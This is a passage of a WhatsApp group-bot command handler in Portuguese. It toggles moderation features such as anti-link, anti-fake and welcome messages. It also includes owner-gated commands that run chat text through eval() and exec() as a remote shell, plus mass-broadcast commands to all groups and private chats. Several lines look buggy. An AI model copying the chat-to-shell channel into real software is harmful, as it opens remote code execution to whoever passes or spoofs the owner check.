                    { buttonId: `${prefix}varantipvon`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antipv Está ${banChats ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantipvon':
                if (!isCreator) return await m.reply('Apenas Meu Dono')
                if (banChats) return await m.reply('já está ativo o modo antipv')
                banChats = true
                nescessario.banChats = banChats
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                await m.reply('*Sucesso alterado para modo antipv, pv não poderá ser utilizado*')
                break

            case 'varantipvoff':
                if (!isCreator) return await m.reply('Apenas meu dono o owner')
                if (!banChats) return await m.reply('Nao estava ativado ainda')
                banChats = false
                nescessario.banChats = banChats
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                await m.reply('*Sucesso modo antipv desligado, pv liberado*')
                break

            case 'eval': {


                if (!isCreator) return
                function Return(sul) {
                    sat = JSON.stringify(sul, null, 2)
                    bang = util.format(sat)
                    if (sat == undefined) {
                        bang = util.format(sul)
                    }
                    return m.reply(bang)
                }
                try {
                    m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                } catch (e) {
                    m.reply(String(e))
                }
            }

                break

            case 'acess':
                if (!isCreator) return m.reply('So Meu Dono')
                teks = body.slice(7)
                exec(teks, (err, stdout) => {
                    if (err) return conn.sendMessage(from, { text: `root@P7-BOT-MD:~ ${err}` }, { quoted: m })
                    if (stdout) {

                        conn.sendMessage(from, { text: stdout }, { quoted: m })

                    }
                })
                break
            case 'mek':
                if (!isCreator) return m.reply('So Meu Dono')
                reqfmek = "m.quoted"
                respostafmek = util.format(eval(`(async () => { return ${reqfmek} })()`))

                m.reply(respostafmek)
                break
            case 'getfig':
                if (!isCreator) return m.reply('So Meu Dono')
                reqfig = "m.quoted.fileSha256.toString('base64').replace(/,/g, '')"
                respostafig = util.format(eval(`(async () => { return ${reqfig} })()`))

                m.reply(respostafig.replace('Promise', '').replace('}', '').replace('{', '').replace("'", '').replace("'", ''))
                break

            case 'reiniciar':
            case 'reinicia':
            case 'desligar':
            case 'desliga':


                if (!isCreator) return m.reply('So Meu Dono')
                await m.reply('Reiniciando o bot.....')
                await process.exit(1)
                break

            case 'anticall':
            case 'antiligar':
            case 'antiligacao':
            case 'antiligação':
                if (!isCreator) return m.reply('So Meu Dono')
                buttonsi = [
                    { buttonId: `${prefix}varanticall 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varanticall 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Anticall Está ${isAnticall ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varanticall':
                try {
                    if (!isCreator) return m.reply('So Meu Dono')
                    if (args.length < 1) return m.reply('Hmmmm')
                    if (Number(args[0]) === 1) {
                        if (isAnticall) return reply('Ja esta ativo')
                        anticall.push('Ativado')
                        fs.writeFileSync('./datab/ants/anticall.json', JSON.stringify(anticall))
                        m.reply('Ativou com sucesso o recurso de antiligação no bot, Reiniciando o bot✔️')
                        await sleep(4000)
                        process.exit(1);
                    } else if (Number(args[0]) === 0) {
                        if (!isAnticall) return m.reply('Ja esta Desativado')
                        fs.writeFileSync('./datab/ants/anticall.json', JSON.stringify([]))
                        m.reply('Desativou com sucesso o recurso de antiligação no bot, Reiniciando o bot✔️')
                        await sleep(4000)
                        process.exit(1);

                    } else {
                        m.reply('1 para ativar, 0 para desativar')
                    }
                } catch {
                    m.reply('Falha ao ativar')
                }
                break

            case 'entrarlink':
            case 'join':
            case 'entrar':
            case 'entrargp':
            case 'aceitarconvite':
            case 'joingp': {


                if (!isCreator) return reply(mess.owner)
                if (!text) return reply('Preciso do link do grupo!')
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Preciso de um link que seja do whatsapp!')
                try {
                    m.reply('Entrei no Grupo')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await conn.groupAcceptInvite(result)
                } catch { reply('Erro Tente Novamente') }
            }

                break
            case 'negarconvite':
                if (!isCreator) return reply(mess.owner)
                try {
                    reply('ok')
                    await conn.sendMessage(`${c}@s.whatsapp.net`, { text: '🚫Seu Convite Para o Grupo Foi Negado Por Meu dono', "contextInfo": { mentionedJid: [sender] } }, { quoted: m })

                } catch {
                    reply('Erro ao Enviar a Msg')
                }
                break
            case 'leave':
            case 'sair':
            case 'exit':
            case 'sairgp':
            case 'sairdogp': {


                if (!isCreator) return reply(mess.owner)
                await conn.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }

                break

            case 'ping':
            case 'botstatus':
            case 'statusbot': {


                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `⏱️Velocidade de Resposta ${latensi.toFixed(4)}  _Segundos_\n\n⏰Tempo online : ${runtime(process.uptime())}\n\n 💻 *Sistema operacional:*  ${os.type() + "\n\n 🌀 *Versão Sistema:* " + os.release() + "\n\n 🏋 *Plataforma:* " + os.platform() }`.trim()



                await conn.sendMessage(m.chat,
                    {
                        image: { url: `https://eruakorl.sirv.com/Bot%20dudinha/ping.jpeg?text.0.text=VELOCIDADE%20DO%20BOT&text.0.position.gravity=north&text.0.position.y=15%25&text.0.size=40&text.0.font.family=Teko&text.0.font.weight=800&text.0.background.opacity=100&text.0.outline.blur=100&text.1.text=${latensi.toFixed(4)}&text.1.position.gravity=center&text.1.size=30&text.1.color=ffffff&text.1.font.family=Teko&text.1.font.weight=800&text.1.background.opacity=100&text.1.outline.blur=100` },
                        caption: respon
                    }, {
                    quoted: m
                })


            }

                break


            case 'serpremium':
            case 'serprem':
                if (!isCreator) return reply(enviar.msg.donosmt)
                premium.push(`${setting.numerodono}@s.whatsapp.net`)
                fs.writeFileSync('./datab/user/premium.json', JSON.stringify(premium))
                reply(`Pronto ${setting.numerodono} você foi adicionado na lista premium.`)
                break

            case 'addpremium':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return
                mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                pru = '.\n'
                for (let _ of mentioned) {
                    pru += `@${_.split('@')[0]}\n`
                }
                premium.push(`${mentioned}`)
                fs.writeFileSync('./datab/user/premium.json', JSON.stringify(premium))
                susp = `👑@${mentioned[0].split('@')[0]} foi adicionado à lista de usuários premium com sucesso👑`
                mentions(`${susp}`, mentioned, true)
                break


            case 'delpremium':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return
                mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                pru = '.\n'
                for (let _ of mentioned) {
                    pru += `@${_.split('@')[0]}\n`
                }
                premium.splice(`${mentioned}`, 1)
                try {
                    fs.writeFileSync('./datab/user/premium.json', JSON.stringify(premium))
                    susp = `✖@${mentioned[0].split('@')[0]} foi removido da lista de usuários premium✖`
                    mentions(`${susp}`, mentioned, true)
                } catch { reply('Marca o @') }
                break

            case 'premiumlist':
                if (!isPremium) return reply(enviar.msg.premium)
                tkks = '╭────*「 *PREMIUM USER👑* 」\n'
                for (let V of premium) {
                    tkks += `│+  @${V.split('@')[0]}\n`
                }
                tkks += `│+ Total : ${premium.length}\n╰──────*「 *${setting.NomeDoBot}* 」*────`
                reply(tkks.trim())
                break


            case 'listapalavrão':
            case 'listapalavra':
            case 'listpalavra':
                let lbw = `Esta é a lista de palavrão\nTotal : ${palavra.length}\n`
                for (let i of palavra) {
                    lbw += `➸ ${i.replace(palavra)}\n`
                }
                await reply(lbw)
                await limitAdd(sender)
                break

            case 'addpalavra':
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (args.length < 1) return reply(`Use assim : ${prefix + command} [palavrão]. exemplo ${prefix + command} puta`)
                const bw = body.slice(12)
                palavra.push(bw)
                fs.writeFileSync('./datab/grupos/palavras.json', JSON.stringify(palavra))
                reply('Palavrão adicionado com sucesso!')
                await limitAdd(sender)
                break

            case 'delpalavra':
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (args.length < 1) return reply(`Use assim : ${prefix + command} [palavrão]. exemplo ${prefix + command} puta`)
                let dbw = body.slice(12)
                palavra.splice(dbw)
                fs.writeFileSync('./datab/grupos/palavras.json', JSON.stringify(palavra))
                reply('Palavrão removido da lista com sucesso!')
                await limitAdd(sender)
                break

            case 'tmgp': {
                if (!isCreator) return reply(mess.owner)
                if (!text) return (`Texto?\n\nEx : ${prefix + command} gay`)
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                await reply(`Pronto chefe!!`)
                for (let i of anu) {
                    await sleep(1500)



                    let txt = `「 TM 」\n\n${text}`
                    await conn.sendMessage(i, { text: txt, mentions: groupMembers.map(r => r.id) }, { quoted: selo })

                }
                await reply(`Sucesso na TM, Enviado ah ${anu.length} gps`)


            }
                break
            case 'tmpvs': {
                if (!isCreator) return reply(mess.owner)
                if(args.length < 1) return reply(`e o texto burro?`)
                let groupMembers   = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                await reply(`enviada com sucesso!!`)
                for (let i of groupMembers) {
                    await sleep (1500)

                    let txt = `「 TM 」\n\n${text}`
                    await conn.sendMessage(i, { text: txt, mentions: groupMembers.map(v => v.id) }, { quoted: selo })
                }
                await reply(`Sucesso na TM, Enviado ah ${v.id.length} pvs`)
            }
                break
                case 'anunciopv': {
   if (!isCreator) return reply(enviar.msg.donosmt)
   anunciopvmem = []
 for (const i of groupMembers) {
await sleep(1500)
conn.sendMessage(i.id, { text: `${c ? c : ''}`})

anunciopvmem.push(i.id)
}
reply(`Sucesso na TM, Enviado ah ${anunciopvmem.length} Membros`)
}
break
break
            //////////////////FIM CMD DONO////////////////////
            ////////////////////////////////////////////////////////////////////////

            //////////////////////////////////////////////////

            case 'nsfw':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varnsfw 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varnsfw 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Nsfw Está ${isNsfw ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break

            case 'varnsfw':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (args.length < 1) return reply('Hmmmm')
                if (Number(args[0]) === 1) {
                    if (isNsfw) return reply('O modo nsfw já está ativo')
                    nsfw.push(from)
                    fs.writeFileSync('./datab/grupos/nsfw.json', JSON.stringify(nsfw))
                    reply(`\`\`\`✓Ativado com sucesso o modo nsfw +18 no grupo\`\`\` *${groupMetadata.subject}*`)
                } else if (Number(args[0]) === 0) {
                    if (!isNsfw) return reply('O modo nsfw já está Desativado')
                    nsfw.splice(from, 1)
                    fs.writeFileSync('./datab/grupos/nsfw.json', JSON.stringify(nsfw))
                    reply(`\`\`\`✓Modo Nsfw +18 desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
                } else {
                    reply('1 para ativar, 0 para desligar')
                }
                break
            case 'antifake':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varfake 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varfake 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antifake Está ${isAntifake ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break

            case 'varfake':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                if (args.length < 1) return m.reply('Ative pressione 1, Desativar pressione 0')
                if (Number(args[0]) === 1) {
                    if (isAntifake) return m.reply(`O recurso de  Anti fake já está Ativado neste grupo: ${groupName}`)
                    if (isAntifake) return m.reply('*O recurso de Anti fake já estava ativo antes*')
                    antifake.push(m.chat)
                    fs.writeFileSync('./datab/ants/antifake.json', JSON.stringify(antifake))
                    m.reply(`Antifake foi ativado com sucesso neste grupo - : ${groupName}`)
                } else if (Number(args[0]) === 0) {
                    if (!isAntifake) return reply(`O recurso de  Anti fake já está Desativado neste grupo.`)
                    antifake.splice(m.chat, 1)
                    fs.writeFileSync('./datab/ants/antifake.json', JSON.stringify(antifake))
                    m.reply(`Antifake foi Desativado com sucesso neste grupo - : ${groupName}`)
                } else {
                    m.reply('「* Adicionar parâmetro 1 ou 0 ')
                }
                break
            case 'antilinkgp':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantilinkgp 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantilinkgp 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o AntiLinkgp Está ${isAntilinkgp ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantilinkgp':
                if (!m.isGroup) return reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
                if (Number(args[0]) === 1) {
                    if (isAntilinkgp) return reply('Ja esta ativo')
                    antilinkgp.push(from)
                    fs.writeFileSync('./datab/ants/antilinkgp.json', JSON.stringify(antilinkgp))
                    reply('🌀 Ativou com sucesso o recurso de antilinkgp 📝')
                } else if (Number(args[0]) === 0) {
                    if (!isAntilinkgp) return reply('Ja esta Desativado')
                    pesquisar = from
                    processo = antilinkgp.indexOf(pesquisar)
                    while (processo >= 0) {
                        antilinkgp.splice(processo, 1)
                        processo = antilinkgp.indexOf(pesquisar)
                    }
                    fs.writeFileSync('./datab/ants/antilinkgp.json', JSON.stringify(antilinkgp))
                    reply('‼️ Desativou com sucesso o recurso de antilink de grupo ✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'limitecaracteres':
            case 'antiflood':
                buttonsi = [
                    { buttonId: `${prefix}varantiflood 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantiflood 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antiflood Está ${isAntiFlood ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })
                break

            case 'varantiflood':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply(`Digite ${prefix + command} 1 para ativar`)
                if (Number(args[0]) === 1) {
                    if (isAntiFlood) return reply(`🌀 O recurso limite de caracteres até ${limitefl} já está ativo no grupo 🌀`)
                    antiflood.push(from)
                    fs.writeFileSync('./datab/ants/antiflood.json', JSON.stringify(antiflood))
                    reply(`✔️ O recurso limite de caracteres ${limitefl} foi ativado nesse grupo📝`)
                } else if (Number(args[0]) === 0) {
                    if (!isAntiFlood) return reply('✔️ O recurso limite de caracteres não está ativado no grupo 📝')
                    let position = false
                    Object.keys(antiflood).forEach((i) => {
                        if (antiflood[i] === from) {
                            position = i
                        }
                    })
                    if (position !== false) {
                        antiflood.splice(position, 1)
                        fs.writeFileSync('./datab/ants/antiflood.json', JSON.stringify(antiflood))
                    }
                    reply('O recurso limite de caracteres foi desativado nesse grupo ✔️')
                } else {
                    reply(`Digite ${prefix + command} 1 para ativar, 0 para desativar o recurso`)
                }
                break

            case 'varantilink':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
                if (Number(args[0]) === 1) {
                    if (isAntiLink) return reply('Ja esta ativo')
                    antilink.push(from)
                    fs.writeFileSync('./datab/ants/antilink.json', JSON.stringify(antilink))
                    reply('🌀 Ativou com sucesso o recurso de antilink neste grupo 📝')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiLink) return reply('Ja esta Desativado')
                    pesquisar = from
                    processo = antilink.indexOf(pesquisar)
                    while (processo >= 0) {
                        antilink.splice(processo, 1)
                        processo = antilink.indexOf(pesquisar)
                    }
                    fs.writeFileSync('./datab/ants/antilink.json', JSON.stringify(antilink))
                    reply('‼️ Desativou com sucesso o recurso de antilink neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break
            case 'antilink':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantilink 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantilink 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antilink Está ${isAntiLink ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break

            case 'adeuscara':
            case 'tchau':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varadeus 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varadeus 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o AdeusCara Está ${isAdeusCara ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varadeus':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
                if (Number(args[0]) === 1) {
                    if (isAdeusCara) return reply('Ja esta ativo')
                    adeuscara.push(from)
                    fs.writeFileSync('./datab/grupos/adeus.json', JSON.stringify(adeuscara))
                    reply('🌀 Ativou com sucesso o recurso de adeuscara neste grupo 📝')
                } else if (Number(args[0]) === 0) {
                    if (!isAdeusCara) return reply('Ja esta Desativado')
                    pesquisar = from
                    processo = adeuscara.indexOf(pesquisar)
                    while (processo >= 0) {
                        adeuscara.splice(processo, 1)
                        processo = adeuscara.indexOf(pesquisar)
                    }
                    fs.writeFileSync('./datab/grupos/adeus.json', JSON.stringify(adeuscara))
                    reply('‼️ Desativou com sucesso o recurso de adeuscara neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'bemvindo':
            case 'welcome':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varbemvindo 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varbemvindo 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Bemvindo Está ${isWelkom ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varbemvindo':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
                if (Number(args[0]) === 1) {
                    if (isWelkom) return reply('Ja esta ativo')
                    welkom.push(from)
                    fs.writeFileSync('./datab/grupos/bemvindo.json', JSON.stringify(welkom))
                    reply('🌀 Ativou com sucesso o recurso de bem vindo neste grupo 📝')
                } else if (Number(args[0]) === 0) {
                    if (!isWelkom) return reply('Ja esta Desativado')
                    pesquisar = from
                    processo = welkom.indexOf(pesquisar)
                    while (processo >= 0) {
                        welkom.splice(processo, 1)
                        processo = welkom.indexOf(pesquisar)
                    }
                    fs.writeFileSync('./datab/grupos/bemvindo.json', JSON.stringify(welkom))
                    reply('‼️ Desativou com sucesso o recurso de bemvindo neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'antilinkhard':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantilinkhard 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantilinkhard 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antilinkhard Está ${isAntiLinkHard ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantilinkhard':
                if (!m.isGroup) return reply('Somente em Grupos')
                if (!isGroupAdmins) return reply('Você Não é adm')
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
                if (Number(args[0]) === 1) {
                    if (isAntiLinkHard) return reply('Ja esta ativo')
                    antilinkhard.push(from)
                    fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
                    reply('🌀 Ativou com sucesso o recurso de antilink hardcore neste grupo 📝')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiLinkHard) return reply('Ja esta Desativado')
                    pesquisar = from
                    processo = antilinkhard.indexOf(pesquisar)
                    while (processo >= 0) {
                        antilinkhard.splice(processo, 1)
                        processo = antilinkhard.indexOf(pesquisar)
                    }
                    fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
                    reply('‼️ Desativou com sucesso o recurso de antilink harcore neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'antiaudio':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantiaudio 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantiaudio 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antiaudio Está ${isAntiAudio ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantiaudio':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Hmmmm')
                if (Number(args[0]) === 1) {
                    if (isAntiAudio) return reply('Ja esta ativo')
                    antiaudio.push(from)
                    fs.writeFileSync('./datab/ants/antiaudio.json', JSON.stringify(antiaudio))
                    reply('Ativou com sucesso o recurso de anti audio neste grupo✔️')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiAudio) return reply('Ja esta Desativado')
                    antiaudio.splice(from, 1)
                    fs.writeFileSync('./datab/ants/antiaudio.json', JSON.stringify(antiaudio))
                    reply('Desativou com sucesso o recurso de anti audio neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'antivideo':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantivideo 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantivideo 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antivideo Está ${isAntiVid ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break

            case 'varantivideo':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Hmmmm')
                if (Number(args[0]) === 1) {
                    if (isAntiVid) return reply('Ja esta ativo')
                    antivid.push(from)
                    fs.writeFileSync('./datab/ants/antivideo.json', JSON.stringify(antivid))
                    reply('Ativou com sucesso o recurso de anti video neste grupo✔️')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiVid) return reply('Ja esta Desativado')
                    antivid.splice(from, 1)
                    fs.writeFileSync('./datab/ants/antivideo.json', JSON.stringify(antivid))
                    reply('Desativou com sucesso o recurso de anti video neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break

            case 'antinotas':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantinotas 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantinotas 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antinotas Está ${isAntiNotas ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break

            case 'varantinotas':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                if (args.length < 1) return reply('Hmmmm')
                if (Number(args[0]) === 1) {
                    if (isAntiNotas) return reply('Já Esta ativo')
                    antinotas.push(from)
                    fs.writeFileSync('./datab/ants/antinotas.json', JSON.stringify(antinotas))
                    reply('Ativou com sucesso o recurso de anti notas neste grupo✔️')
                } else if (Number(args[0]) === 0) {
                    if (!isAntiNotas) return reply('Ja esta Desativado.')
                    antinotas.splice(from, 1)
                    fs.writeFileSync('./datab/ants/antinotas.json', JSON.stringify(antinotas))
                    reply('Desativou com sucesso o recurso de anti notas neste grupo✔️')
                } else {
                    reply('1 para ativar, 0 para desativar')
                }
                break
            case 'antidocumento':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varantidocumento 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varantidocumento 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antidocumento Está ${Antidoc ? 'Ativo' : 'Desativado'}`,
                    footer: `By: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await conn.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break
            case 'varantidocumento':
                if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
                if (!isGroupAdmins) return reply(`PRECISA SER ADMIN`)
